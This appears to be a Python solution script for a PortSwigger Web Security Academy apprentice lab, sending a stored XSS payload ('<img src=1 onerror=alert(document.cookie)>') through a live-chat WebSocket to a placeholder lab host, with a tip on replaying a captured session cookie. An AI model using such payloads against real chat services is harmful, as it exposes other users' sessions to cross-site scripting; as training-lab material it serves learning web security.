"""
Lab 1: Manipulating WebSocket messages to exploit vulnerabilities
https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities
Difficulty: Apprentice

📝 A live chat feature sends messages over the socket with no server-side
sanitization — same reflected/stored XSS mindset as the XSS module, just
delivered via a WebSocket frame instead of a form POST.

Goal: deliver alert(document.cookie) to anyone viewing the live chat.
"""

from utils import ws_handshake, send_ws_text, recv_ws_text, log, note

HOST = "YOUR-LAB-ID.web-security-academy.net"
WS_PATH = "/chat"  # confirm the exact WebSocket endpoint from the page's JS


def run():
    note("Opening the WebSocket connection (handshake over HTTPS, then")
    note("switching to the framed protocol).")

    sock, handshake_response = ws_handshake(HOST, WS_PATH, cookie=None)
    log("Handshake succeeded (101 Switching Protocols).")

    payload = '<img src=1 onerror=alert(document.cookie)>'
    note(f"Sending chat message payload: {payload}")
    send_ws_text(sock, payload)

    echo = recv_ws_text(sock)
    log(f"Server response/echo: {echo!r}")

    note("If the chat is session-scoped, re-run this with a real session")
    note("Cookie (ws_handshake(..., cookie='session=...')) captured from a")
    note("logged-in browser, so the message posts as an authenticated user.")


if __name__ == "__main__":
    run()
